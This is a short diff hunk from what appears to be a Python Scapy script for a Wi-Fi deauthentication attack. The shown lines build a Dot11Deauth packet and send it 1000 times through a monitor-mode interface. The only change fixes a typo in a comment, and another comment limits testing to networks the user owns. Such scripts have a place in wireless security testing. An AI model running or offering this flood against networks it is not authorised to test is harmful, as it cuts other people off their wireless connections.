@@ -9,5 +9,5 @@ packet = RadioTap()/deauthp/Dot11Deauth(reason=7)
 
 sendp(packet, inter=0.1, count=1000, iface="wlan0mon", verbose=1)
 
-# Run this is monitor
+# Run this as monitor
 # Only test on network setups you own
